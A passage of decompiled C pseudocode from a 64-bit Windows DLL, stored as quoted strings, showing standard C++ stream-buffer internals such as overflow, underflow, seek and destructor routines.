    "          if ( v38 > 0xF )",
    "            v24 = (__int128 *)v36;",
    "          v25 = v37 - v23;",
    "          sub_180036160(v24, (char *)v24 + v23, v37 - v23 + 1);",
    "          v37 = v25;",
    "          v26 = sub_18001E1B0(*(_QWORD *)(a1 + 128));",
    "          v15 = v26;",
    "          if ( v26 == -1 )",
    "            goto LABEL_31;",
    "        }",
    "        if ( v21 != 2 )",
    "          goto LABEL_31;",
    "        v29 = (char *)&v36;",
    "        if ( v38 > 0xF )",
    "          v29 = (char *)v36;",
    "        v13 = *v29;",
    "      }",
    "LABEL_32:",
    "      if ( v38 > 0xF )",
    "      {",
    "        v27 = v38 + 1;",
    "        v28 = v36;",
    "        if ( v38 + 1 >= 0x1000 )",
    "        {",
    "          v27 = v38 + 40;",
    "          v28 = *(_QWORD *)(v36 - 8);",
    "          if ( (unsigned __int64)(v36 - v28 - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v28, v27);",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v12 = sub_18001E1B0(v11);",
    "      v13 = -1;",
    "      if ( v12 != -1 )",
    "        return (unsigned __int8)v12;",
    "    }",
    "    return v13;",
    "  }",
    "  else",
    "  {",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180005970(__int64 a1)",
    "{",
    "  unsigned __int8 *v2; // rcx",
    "  __int64 result; // rax",
    "  unsigned int v4; // edi",
    "",
    "  v2 = **(unsigned __int8 ***)(a1 + 56);",
    "  if ( v2 && v2 < &v2[**(int **)(a1 + 80)] )",
    "    return *v2;",
    "  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56LL))(a1);",
    "  v4 = result;",
    "  if ( (_DWORD)result != -1 )",
    "  {",
    "    (*(void (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 32LL))(a1, (unsigned int)result);",
    "    return v4;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800059E0(__int64 a1, unsigned int a2)",
    "{",
    "  unsigned int v3; // edi",
    "  unsigned __int64 v4; // rcx",
    "  __int64 v6; // rdx",
    "  _QWORD *v7; // r9",
    "  _BYTE *v8; // rdx",
    "  _QWORD *v9; // r10",
    "  int **v10; // r8",
    "",
    "  v3 = a2;",
    "  v4 = **(_QWORD **)(a1 + 56);",
    "  if ( v4 && **(_QWORD **)(a1 + 24) < v4 && (a2 == -1 || *(unsigned __int8 *)(v4 - 1) == a2) )",
    "  {",
    "    ++**(_DWORD **)(a1 + 80);",
    "    --**(_QWORD **)(a1 + 56);",
    "    if ( a2 == -1 )",
    "      return 0;",
    "    return v3;",
    "  }",
    "  v6 = *(_QWORD *)(a1 + 128);",
    "  if ( !v6 || v3 == -1 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( !*(_QWORD *)(a1 + 104) && (unsigned int)sub_18001E5FC((unsigned __int8)v3, v6) != -1 )",
    "    return v3;",
    "  v7 = *(_QWORD **)(a1 + 56);",
    "  v8 = (_BYTE *)(a1 + 112);",
    "  if ( *v7 == a1 + 112 )",
    "    return 0xFFFFFFFFLL;",
    "  v9 = *(_QWORD **)(a1 + 24);",
    "  v10 = (int **)(a1 + 80);",
    "  *v8 = v3;",
    "  if ( (_BYTE *)*v9 != v8 )",
    "  {",
    "    *(_QWORD *)(a1 + 136) = *v9;",
    "    *(_QWORD *)(a1 + 144) = *v7 + **v10;",
    "  }",
    "  *v9 = v8;",
    "  **(_QWORD **)(a1 + 56) = v8;",
    "  **v10 = 1;",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180005AD0(__int64 a1, unsigned int a2)",
    "{",
    "  __int64 result; // rax",
    "  unsigned __int64 v5; // rdx",
    "  int *v6; // rax",
    "  __int64 v7; // r8",
    "  _QWORD *v8; // rdx",
    "  _BYTE *v9; // r8",
    "  _QWORD *v10; // r8",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rdx",
    "  __int64 v13; // rcx",
    "  __int64 v14; // rcx",
    "  int v15; // eax",
    "  int v16; // eax",
    "  int v17; // eax",
    "  unsigned int v18; // ecx",
    "  __int64 v19; // rsi",
    "  unsigned int v20; // ecx",
    "  _BYTE *v21; // [rsp+40h] [rbp-48h] BYREF",
    "  char *v22; // [rsp+48h] [rbp-40h] BYREF",
    "  char v23; // [rsp+50h] [rbp-38h] BYREF",
    "  _BYTE v24[7]; // [rsp+51h] [rbp-37h] BYREF",
    "  _BYTE v25[32]; // [rsp+58h] [rbp-30h] BYREF",
    "  __int64 v26; // [rsp+78h] [rbp-10h] BYREF",
    "",
    "  if ( a2 == -1 )",
    "    return 0;",
    "  v5 = **(_QWORD **)(a1 + 64);",
    "  if ( v5 )",
    "  {",
    "    v6 = *(int **)(a1 + 88);",
    "    v7 = *v6;",
    "    if ( v5 < v5 + v7 )",
    "    {",
    "      *v6 = v7 - 1;",
    "      result = a2;",
    "      v8 = *(_QWORD **)(a1 + 64);",
    "      v9 = (_BYTE *)(*v8)++;",
    "      *v9 = a2;",
    "      return result;",
    "    }",
    "  }",
    "  if ( !*(_QWORD *)(a1 + 128) )",
    "    return 0xFFFFFFFFLL;",
    "  v10 = *(_QWORD **)(a1 + 24);",
    "  if ( *v10 == a1 + 112 )",
    "  {",
    "    v11 = *(_QWORD *)(a1 + 136);",
    "    v12 = *(_QWORD *)(a1 + 144);",
    "    *v10 = v11;",
    "    **(_QWORD **)(a1 + 56) = v11;",
    "    **(_DWORD **)(a1 + 80) = v12 - v11;",
    "  }",
    "  v13 = *(_QWORD *)(a1 + 104);",
    "  if ( !v13 )",
    "  {",
    "    v14 = (unsigned int)(char)a2;",
    "LABEL_15:",
    "    v17 = sub_18001E444(v14, *(_QWORD *)(a1 + 128));",
    "    v18 = -1;",
    "    if ( v17 != -1 )",
    "      return a2;",
    "    return v18;",
    "  }",
    "  v23 = a2;",
    "  v15 = (*(__int64 (__fastcall **)(__int64, __int64, char *, _BYTE *, char **, _BYTE *, __int64 *, _BYTE **))(*(_QWORD *)v13 + 56LL))(",
    "          v13,",
    "          a1 + 116,",
    "          &v23,",
    "          v24,",
    "          &v22,",
    "          v25,",
    "          &v26,",
    "          &v21);",
    "  if ( v15 )",
    "  {",
    "    v16 = v15 - 1;",
    "    if ( v16 )",
    "    {",
    "      if ( v16 == 2 )",
    "      {",
    "        v14 = (unsigned int)v23;",
    "        goto LABEL_15;",
    "      }",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  if ( v21 != v25 )",
    "  {",
    "    v19 = v21 - v25;",
    "    if ( v19 != sub_18001FFA8(v25, 1, v21 - v25) )",
    "      return 0xFFFFFFFFLL;",
    "  }",
    "  *(_BYTE *)(a1 + 113) = 1;",
    "  v20 = -1;",
    "  if ( v22 != &v23 )",
    "    return a2;",
    "  return v20;",
    "}",
    "",
    "",
    "void **__fastcall sub_180005CB0(__int64 a1)",
    "{",
    "  _QWORD *v2; // rcx",
    "  __int64 v3; // r8",
    "  __int64 v4; // rdx",
    "  void **result; // rax",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rcx",
    "  void (__fastcall ***v8)(_QWORD, __int64); // rax",
    "",
    "  *(_QWORD *)a1 = &off_18003A5D0;",
    "  if ( *(_QWORD *)(a1 + 128) )",
    "  {",
    "    v2 = *(_QWORD **)(a1 + 24);",
    "    if ( *v2 == a1 + 112 )",
    "    {",
    "      v3 = *(_QWORD *)(a1 + 144);",
    "      v4 = *(_QWORD *)(a1 + 136);",
    "      *v2 = v4;",
    "      **(_QWORD **)(a1 + 56) = v4;",
    "      **(_DWORD **)(a1 + 80) = v3 - v4;",
    "    }",
    "  }",
    "  if ( *(_BYTE *)(a1 + 124) )",
    "    sub_180008390(a1);",
    "  result = &off_18003A550;",
    "  *(_QWORD *)a1 = &off_18003A550;",
    "  v6 = *(_QWORD *)(a1 + 96);",
    "  if ( v6 )",
    "  {",
    "    v7 = *(_QWORD *)(v6 + 8);",
    "    if ( v7 )",
    "    {",
    "      v8 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 16LL))(v7);",
    "      if ( v8 )",
    "        (**v8)(v8, 1);",
    "    }",
    "    return (void **)sub_1800116E0(v6, 16);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180005D60(__int64 *a1)",
    "{",
    "  __int64 v2; // rcx",
    "  __int64 v3; // rcx",
    "  unsigned __int64 v4; // rdx",
    "  __int64 result; // rax",
    "",
    "  v2 = *a1;",
    "  if ( v2 )",
    "  {",
    "    sub_18000ACE0(v2, a1[1]);",
    "    v3 = *a1;",
    "    v4 = (a1[2] - *a1) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    if ( v4 >= 0x1000 )",
    "    {",
    "      v4 += 39LL;",
    "      if ( (unsigned __int64)(v3 - *(_QWORD *)(v3 - 8) - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "      v3 = *(_QWORD *)(v3 - 8);",
    "    }",
    "    sub_1800116E0(v3, v4);",
    "    result = 0;",
    "    *a1 = 0;",
    "    a1[1] = 0;",
    "    a1[2] = 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_180005E50(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v5; // rdi",
    "  int v6; // esi",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rax",
    "  bool v10; // al",
    "  __int64 *v11; // rax",
    "  __int64 v12; // r14",
    "  __int64 v13; // r13",
    "  unsigned __int64 v14; // r15",
    "  __int64 v15; // r12",
    "  __int64 v16; // rax",
    "  void (__fastcall ***v17)(_QWORD, __int64); // rax",
    "  __int64 v18; // r9",
    "  __int64 v19; // rax",
    "  char v20; // dl",
    "  __int64 v21; // rcx",
    "  int v22; // esi",
    "  int v23; // edx",
    "  __int64 v24; // rdx",
    "  __int64 v25; // rcx",
    "  const char *v27; // rbx",
    "  __m128i *v28; // rax",
    "  char v29; // [rsp+20h] [rbp-B8h]",
    "  int v30; // [rsp+28h] [rbp-B0h]",
    "  __int64 v31; // [rsp+30h] [rbp-A8h]",
    "  __int128 v33; // [rsp+40h] [rbp-98h] BYREF",
    "  __int64 *v34; // [rsp+50h] [rbp-88h]",
    "  bool v35; // [rsp+58h] [rbp-80h]",
    "  _QWORD pExceptionObject[6]; // [rsp+60h] [rbp-78h] BYREF",
    "  __int128 v37; // [rsp+90h] [rbp-48h] BYREF",
    "  _BYTE v38[4]; // [rsp+A0h] [rbp-38h] BYREF",
    "  _BYTE v39[4]; // [rsp+A4h] [rbp-34h] BYREF",
    "",
    "  HIDWORD(v31) = dword_18004BCC8;",
    "  v5 = 0;",
    "  v6 = 0;",
    "  LODWORD(v31) = 0;",
    "  v34 = a1;",
    "  v7 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "  if ( v7 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v7 + 8LL))(v7);",
    "  v8 = *a1;",
    "  v9 = *(int *)(*a1 + 4);",
    "  if ( *(_DWORD *)((char *)a1 + v9 + 16) )",
    "  {",
    "    v10 = 0;",
    "  }",
    "  else",
    "  {",
    "    v11 = *(__int64 **)((char *)a1 + v9 + 80);",
    "    if ( !v11 || v11 == a1 )",
    "    {",
    "      v10 = 1;",
    "    }",
    "    else",
    "    {",
    "      sub_180009180(v11);",
    "      v8 = *a1;",
    "      v10 = *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4) + 16) == 0;",
    "    }",
    "  }",
    "  v35 = v10;",
    "  if ( !v10 )",
    "  {",
    "    v20 = 4;",
    "    goto LABEL_30;",
    "  }",
    "  v12 = *(_QWORD *)(*(__int64 *)((char *)a1 + *(int *)(v8 + 4) + 64) + 8);",
    "  *((_QWORD *)&v33 + 1) = v12;",
    "  (*(void (__fastcall **)(__int64))(*(_QWORD *)v12 + 8LL))(v12);",
    "  sub_18000FC70(v39, 0);",
    "  v13 = qword_18004DE50;",
    "  *(_QWORD *)&v37 = qword_18004DE50;",
    "  v14 = qword_18004E1E0;",
    "  if ( !qword_18004E1E0 )",
    "  {",
    "    sub_18000FC70(v38, 0);",
    "    if ( !qword_18004E1E0 )",
    "      qword_18004E1E0 = ++dword_18004C6A0;",
    "    sub_18000FCE8(v38);",
    "    v14 = qword_18004E1E0;",
    "  }",
    "  v15 = 8 * v14;",
    "  if ( v14 >= *(_QWORD *)(v12 + 24) || (v5 = *(_QWORD *)(v15 + *(_QWORD *)(v12 + 16))) == 0 )",
    "  {",
    "    if ( *(_BYTE *)(v12 + 36) )",
    "    {",
    "      v16 = sub_1800101B8();",
    "      if ( v14 >= *(_QWORD *)(v16 + 24) )",
    "        goto LABEL_20;",
    "      v5 = *(_QWORD *)(v15 + *(_QWORD *)(v16 + 16));",
    "    }",
    "    if ( !v5 )",
    "    {",
    "LABEL_20:",
    "      if ( v13 )",
    "      {",
    "        v5 = v13;",
    "      }",
    "      else",
    "      {",
    "        if ( sub_18000C5F0(&v37, &v33) == -1 )",
    "          Concurrency::cancel_current_task();",
    "        v5 = v37;",
    "        sub_180010180(v37);",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 8LL))(v5);",
    "        qword_18004DE50 = v5;",
    "      }",
    "    }",
    "  }",
    "  sub_18000FCE8(v39);",
    "  v17 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v12 + 16LL))(v12);",
    "  if ( v17 )",
    "    (**v17)(v17, 1);",
    "  v18 = (__int64)a1 + *(int *)(*a1 + 4);",
    "  v19 = *(_QWORD *)(v18 + 72);",
    "  LOBYTE(v37) = 0;",
    "  *((_QWORD *)&v37 + 1) = v19;",
    "  LOBYTE(v19) = *(_BYTE *)(v18 + 88);",
    "  v33 = v37;",
    "  v30 = HIDWORD(v31);",
    "  v29 = v19;",
    "  (*(void (__fastcall **)(__int64, __int128 *, __int128 *))(*(_QWORD *)v5 + 72LL))(v5, &v37, &v33);",
    "  v20 = 4;",
    "  if ( (_BYTE)v37 )",
    "    v6 = 4;",
    "  LODWORD(v31) = v6;",
    "LABEL_30:",
    "  v21 = (__int64)a1 + *(int *)(*a1 + 4);",
    "  v22 = *(_DWORD *)(v21 + 16) | v6;",
    "  if ( *(_QWORD *)(v21 + 72) )",
    "    v20 = 0;",
    "  v23 = ((unsigned __int8)v22 | (unsigned __int8)v20) & 0x17;",
    "  *(_DWORD *)(v21 + 16) = v23;",
    "  v24 = *(_DWORD *)(v21 + 20) & (unsigned int)v23;",
    "  if ( (_DWORD)v24 )",
    "  {",
    "    if ( (v24 & 4) != 0 )",
    "    {",
    "      v27 = \"ios_base::badbit set\";",
    "    }",
    "    else",
    "    {",
    "      v27 = \"ios_base::failbit set\";",
    "      if ( (v24 & 2) == 0 )",
    "        v27 = \"ios_base::eofbit set\";",
    "    }",
    "    v28 = (__m128i *)unknown_libname_1(&v33, 1);",
    "    sub_180001E10(pExceptionObject, (__int64)v27, v28);",
    "    throw (std::ios_base::failure *)pExceptionObject;",
    "  }",
    "  if ( !(unsigned __int8)sub_180010AB0(v21, v24, a3, a4, v29, v30, v31, a1) )",
    "    sub_1800092E0(a1);",
    "  v25 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "  if ( v25 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v25 + 16LL))(v25);",
    "  return a1;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_180006190(__int64 a1, unsigned __int64 *a2, _QWORD *a3, char a4)",
    "{",
    "  bool v5; // cl",
    "  bool v6; // al",
    "  unsigned __int64 v7; // r8",
    "  __int64 v8; // rsi",
    "  unsigned __int64 v9; // rcx",
    "  __int64 *v10; // r14",
    "  __int64 v11; // rbx",
    "  __int64 v12; // rdi",
    "  __int64 v13; // r10",
    "  int v14; // ecx",
    "",
    "  v5 = (a4 & 1) != 0 && (*(_BYTE *)(a1 + 112) & 4) != 0;",
    "  v6 = (a4 & 2) != 0 && (*(_BYTE *)(a1 + 112) & 2) != 0;",
    "  if ( v5 || v6 )",
    "    goto LABEL_29;",
    "  v7 = *a3 + a3[1];",
    "  v8 = **(_QWORD **)(a1 + 56);",
    "  if ( (*(_BYTE *)(a1 + 112) & 2) != 0 )",
    "  {",
    "    v9 = 0;",
    "  }",
    "  else",
    "  {",
    "    v9 = **(_QWORD **)(a1 + 64);",
    "    if ( v9 && *(_QWORD *)(a1 + 104) < v9 )",
    "      *(_QWORD *)(a1 + 104) = v9;",
    "  }",
    "  v10 = *(__int64 **)(a1 + 24);",
    "  v11 = *(_QWORD *)(a1 + 104);",
    "  v12 = *v10;",
    "  if ( v7 > v11 - *v10 || v7 && ((a4 & 1) != 0 && !v8 || (a4 & 2) != 0 && !v9) )",
    "  {",
    "LABEL_29:",
    "    *a2 = -1;",
    "  }",
    "  else",
    "  {",
    "    v13 = v12 + v7;",
    "    if ( (a4 & 1) != 0 && v8 )",
    "    {",
    "      *v10 = v12;",
    "      **(_QWORD **)(a1 + 56) = v13;",
    "      **(_DWORD **)(a1 + 80) = v11 - v13;",
    "    }",
    "    if ( (a4 & 2) != 0 && v9 )",
    "    {",
    "      v14 = **(_DWORD **)(a1 + 64) + **(_DWORD **)(a1 + 88) - v13;",
    "      **(_QWORD **)(a1 + 32) = v12;",
    "      **(_QWORD **)(a1 + 64) = v13;",
    "      **(_DWORD **)(a1 + 88) = v14;",
    "    }",
    "    *a2 = v7;",
    "  }",
    "  a2[1] = 0;",
    "  a2[2] = 0;",
    "  return a2;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800062C0(__int64 a1, _QWORD *a2, __int64 a3, int a4, char a5)",
    "{",
    "  bool v8; // cl",
    "  bool v9; // al",
    "  __int64 v10; // rcx",
    "  unsigned __int64 v11; // r8",
    "  __int64 *v12; // rax",
    "  __int64 v13; // r9",
    "  unsigned __int64 v14; // rsi",
    "  int v15; // edi",
    "  __int64 v16; // rax",
    "  __int64 v17; // r10",
    "  __int64 v18; // rdi",
    "  int v19; // ecx",
    "  int v20; // ecx",
    "",
    "  v8 = (a5 & 1) != 0 && (*(_BYTE *)(a1 + 112) & 4) != 0;",
    "  v9 = (a5 & 2) != 0 && (*(_BYTE *)(a1 + 112) & 2) != 0;",
    "  if ( v8 || v9 )",
    "    goto LABEL_43;",
    "  v10 = **(_QWORD **)(a1 + 56);",
    "  if ( (*(_BYTE *)(a1 + 112) & 2) != 0 )",
    "  {",
    "    v11 = 0;",
    "  }",
    "  else",
    "  {",
    "    v11 = **(_QWORD **)(a1 + 64);",
    "    if ( v11 && *(_QWORD *)(a1 + 104) < v11 )",
    "      *(_QWORD *)(a1 + 104) = v11;",
    "  }",
    "  v12 = *(__int64 **)(a1 + 24);",
    "  v13 = *v12;",
    "  v14 = *(_QWORD *)(a1 + 104) - *v12;",
    "  if ( !a4 )",
    "  {",
    "    v16 = 0;",
    "    goto LABEL_30;",
    "  }",
    "  v15 = a4 - 1;",
    "  if ( !v15 )",
    "  {",
    "    if ( (a5 & 3) != 3 )",
    "    {",
    "      if ( (a5 & 1) != 0 )",
    "      {",
    "        if ( v10 || !v13 )",
    "        {",
    "          v16 = v10 - v13;",
    "          goto LABEL_30;",
    "        }",
    "      }",
    "      else if ( (a5 & 2) != 0 && (v11 || !v13) )",
    "      {",
    "        v16 = v11 - v13;",
    "        goto LABEL_30;",
    "      }",
    "    }",
    "LABEL_43:",
    "    *a2 = -1;",
    "    goto LABEL_44;",
    "  }",
    "  if ( v15 != 1 )",
    "    goto LABEL_43;",
    "  v16 = *(_QWORD *)(a1 + 104) - *v12;",
    "LABEL_30:",
    "  v17 = v16 + a3;",
    "  if ( v16 + a3 > v14 || v17 && ((a5 & 1) != 0 && !v10 || (a5 & 2) != 0 && !v11) )",
    "    goto LABEL_43;",
    "  v18 = v13 + v17;",
    "  if ( (a5 & 1) != 0 && v10 )",
    "  {",
    "    v19 = *(_QWORD *)(a1 + 104) - v18;",
    "    **(_QWORD **)(a1 + 24) = v13;",
    "    **(_QWORD **)(a1 + 56) = v18;",
    "    **(_DWORD **)(a1 + 80) = v19;",
    "  }",
    "  if ( (a5 & 2) != 0 && v11 )",
    "  {",
    "    v20 = **(_DWORD **)(a1 + 64) + **(_DWORD **)(a1 + 88) - v18;",
    "    **(_QWORD **)(a1 + 32) = v13;",
    "    **(_QWORD **)(a1 + 64) = v18;",
    "    **(_DWORD **)(a1 + 88) = v20;",
    "  }",
    "  *a2 = v17;",
    "LABEL_44:",
    "  a2[1] = 0;",
    "  a2[2] = 0;",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006450(__int64 a1)",
    "{",
    "  unsigned __int8 **v1; // r10",
    "  unsigned __int8 *v3; // r8",
    "  unsigned __int64 *v5; // rax",
    "  unsigned __int64 v6; // r9",
    "  unsigned __int8 *v7; // rcx",
    "",
    "  v1 = *(unsigned __int8 ***)(a1 + 56);",
    "  v3 = *v1;",
    "  if ( !*v1 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( v3 < &v3[**(int **)(a1 + 80)] )",
    "    return *v3;",
    "  v5 = *(unsigned __int64 **)(a1 + 64);",
    "  if ( !*v5 || (*(_BYTE *)(a1 + 112) & 4) != 0 )",
    "    return 0xFFFFFFFFLL;",
    "  v6 = *(_QWORD *)(a1 + 104);",
    "  if ( v6 < *v5 )",
    "    v6 = *v5;",
    "  if ( v6 <= (unsigned __int64)v3 )",
    "    return 0xFFFFFFFFLL;",
    "  *(_QWORD *)(a1 + 104) = v6;",
    "  v7 = *v1;",
    "  *v1 = *v1;",
    "  **(_DWORD **)(a1 + 80) = v6 - (_DWORD)v7;",
    "  return ***(unsigned __int8 ***)(a1 + 56);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006530(__int64 a1, unsigned int a2)",
    "{",
    "  __int64 result; // rax",
    "  unsigned __int64 *v5; // rax",
    "  int *v6; // rcx",
    "  unsigned __int64 v7; // r8",
    "  __int64 v8; // rax",
    "  unsigned __int64 v9; // rbx",
    "  _QWORD *v10; // rcx",
    "  _BYTE *v11; // rdx",
    "  __int64 v12; // rsi",
    "  unsigned __int64 v13; // rbx",
    "  unsigned __int64 v14; // rbp",
    "  unsigned __int64 v15; // r14",
    "  __int64 v16; // rcx",
    "  __int64 v17; // rax",
    "  unsigned __int64 v18; // rcx",
    "  int v19; // edx",
    "  _DWORD *v20; // rax",
    "  _QWORD *v21; // rcx",
    "  _BYTE *v22; // rdx",
    "",
    "  if ( (*(_BYTE *)(a1 + 112) & 2) != 0 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( a2 == -1 )",
    "    return 0;",
    "  v5 = *(unsigned __int64 **)(a1 + 64);",
    "  v6 = *(int **)(a1 + 88);",
    "  v7 = *v5;",
    "  v8 = *v6;",
    "  v9 = v7 + v8;",
    "  if ( !v7 )",
    "  {",
    "    v13 = 0;",
    "    v12 = **(_QWORD **)(a1 + 24);",
    "LABEL_19:",
    "    v14 = 32;",
    "    goto LABEL_20;",
    "  }",
    "  if ( v7 < v9 )",
    "  {",
    "    *v6 = v8 - 1;",
    "    v10 = *(_QWORD **)(a1 + 64);",
    "    v11 = (_BYTE *)(*v10)++;",
    "    *v11 = a2;",
    "    *(_QWORD *)(a1 + 104) = v7 + 1;",
    "    return a2;",
    "  }",
    "  v12 = **(_QWORD **)(a1 + 24);",
    "  v13 = v9 - v12;",
    "  if ( v13 < 0x20 )",
    "    goto LABEL_19;",
    "  if ( v13 < 0x3FFFFFFF )",
    "  {",
    "    v14 = 2 * v13;",
    "    if ( !(2 * v13) )",
    "    {",
    "      v15 = 0;",
    "      goto LABEL_21;",
    "    }",
    "    if ( v14 >= 0x1000 )",
    "    {",
    "      v16 = v14 + 39;",
    "      if ( v14 + 39 < v14 )",
    "        Concurrency::cancel_current_task();",
    "      goto LABEL_16;",
    "    }",
    "LABEL_20:",
    "    v15 = sub_180011714(v14);",
    "    goto LABEL_21;",
    "  }",
    "  LODWORD(v14) = 0x7FFFFFFF;",
    "  if ( v13 < 0x7FFFFFFF )",
    "  {",
    "    v16 = 2147483686LL;",
    "LABEL_16:",
    "    v17 = sub_180011714(v16);",
    "    if ( !v17 )",
    "      goto LABEL_31;",
    "    v15 = (v17 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    *(_QWORD *)(v15 - 8) = v17;",
    "LABEL_21:",
    "    sub_180036160(v15, v12, v13);",
    "    *(_QWORD *)(a1 + 104) = v15 + v13 + 1;",
    "    **(_QWORD **)(a1 + 32) = v15;",
    "    **(_QWORD **)(a1 + 64) = v15 + v13;",
    "    **(_DWORD **)(a1 + 88) = v14 - v13;",
    "    if ( (*(_BYTE *)(a1 + 112) & 4) != 0 )",
    "    {",
    "      **(_QWORD **)(a1 + 24) = v15;",
    "      **(_QWORD **)(a1 + 56) = v15;",
    "      **(_DWORD **)(a1 + 80) = 0;",
    "    }",
    "    else",
    "    {",
    "      v18 = v15 + **(_QWORD **)(a1 + 56) - v12;",
    "      v19 = *(_QWORD *)(a1 + 104) - v18;",
    "      **(_QWORD **)(a1 + 24) = v15;",
    "      **(_QWORD **)(a1 + 56) = v18;",
    "      **(_DWORD **)(a1 + 80) = v19;",
    "    }",
    "    if ( (*(_BYTE *)(a1 + 112) & 1) == 0 )",
    "      goto LABEL_29;",
    "    if ( v13 < 0x1000 )",
    "    {",
    "LABEL_28:",
    "      sub_1800116E0(v12, v13);",
    "LABEL_29:",
    "      v20 = *(_DWORD **)(a1 + 88);",
    "      *(_DWORD *)(a1 + 112) |= 1u;",
    "      --*v20;",
    "      v21 = *(_QWORD **)(a1 + 64);",
    "      v22 = (_BYTE *)(*v21)++;",
    "      result = a2;",
    "      *v22 = a2;",
    "      return result;",
    "    }",
    "    v13 += 39LL;",
    "    if ( (unsigned __int64)(v12 - *(_QWORD *)(v12 - 8) - 8) <= 0x1F )",
    "    {",
    "      v12 = *(_QWORD *)(v12 - 8);",
    "      goto LABEL_28;",
    "    }",
    "LABEL_31:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "void **__fastcall sub_180006730(__int64 a1)",
    "{",
    "  bool v1; // zf",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rdx",
    "  __int64 v5; // rcx",
    "  unsigned __int64 v6; // rdx",
    "  void **result; // rax",
    "  __int64 v8; // rbx",
    "  __int64 v9; // rcx",
    "  void (__fastcall ***v10)(_QWORD, __int64); // rax",
    "",
    "  v1 = (*(_BYTE *)(a1 + 112) & 1) == 0;",
    "  *(_QWORD *)a1 = &off_180044AA8;",
    "  if ( !v1 )",
    "  {",
    "    v3 = **(_QWORD **)(a1 + 64);",
    "    if ( v3 )",
    "      v4 = v3 + **(int **)(a1 + 88);",
    "    else",
    "      v4 = **(_QWORD **)(a1 + 56) + **(int **)(a1 + 80);",
    "    v5 = **(_QWORD **)(a1 + 24);",
    "    v6 = v4 - v5;",
    "    if ( v6 >= 0x1000 )",
    "    {",
    "      v6 += 39LL;",
    "      if ( (unsigned __int64)(v5 - *(_QWORD *)(v5 - 8) - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "      v5 = *(_QWORD *)(v5 - 8);",
    "    }",
    "    sub_1800116E0(v5, v6);",
    "  }",
    "  **(_QWORD **)(a1 + 24) = 0;",
    "  **(_QWORD **)(a1 + 56) = 0;",
    "  **(_DWORD **)(a1 + 80) = 0;",
    "  **(_QWORD **)(a1 + 32) = 0;",
    "  **(_QWORD **)(a1 + 64) = 0;",
    "  **(_DWORD **)(a1 + 88) = 0;",
    "  result = &off_18003A550;",
    "  *(_DWORD *)(a1 + 112) &= ~1u;",
    "  *(_QWORD *)a1 = &off_18003A550;",
    "  *(_QWORD *)(a1 + 104) = 0;",
    "  v8 = *(_QWORD *)(a1 + 96);",
    "  if ( v8 )",
    "  {",
    "    v9 = *(_QWORD *)(v8 + 8);",
    "    if ( v9 )",
    "    {",
    "      v10 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 16LL))(v9);",
    "      if ( v10 )",
    "        (**v10)(v10, 1);",
    "    }",
    "    return (void **)sub_1800116E0(v8, 16);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006870(_QWORD **a1, unsigned __int8 *a2, __int64 a3)",
    "{",
    "  __int64 v3; // rbx",
    "  int **v7; // rsi",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rbp",
    "",
    "  v3 = a3;",
    "  if ( a3 > 0 )",
    "  {",
    "    v7 = (int **)(a1 + 11);",
    "    do",
    "    {",
    "      v8 = *a1[8];",
    "      if ( v8 && (v9 = **v7, (int)v9 > 0) )",
    "      {",
    "        v10 = v3;",
    "        if ( v3 >= v9 )",
    "          v10 = **v7;",
    "        sub_180036160(v8, a2, v10);",
    "        v3 -= v10;",
    "        **v7 -= v10;",
    "        *a1[8] += (int)v10;",
    "      }",
    "      else",
    "      {",
    "        if ( ((unsigned int (__fastcall *)(_QWORD **, _QWORD))(*a1)[3])(a1, *a2) == -1 )",
    "          return a3 - v3;",
    "        --v3;",
    "        v7 = (int **)(a1 + 11);",
    "        v10 = 1;",
    "      }",
    "      a2 += v10;",
    "    }",
    "    while ( v3 > 0 );",
    "  }",
    "  return a3 - v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006930(_QWORD **a1, _BYTE *a2, __int64 a3)",
    "{",
    "  __int64 v3; // rbx",
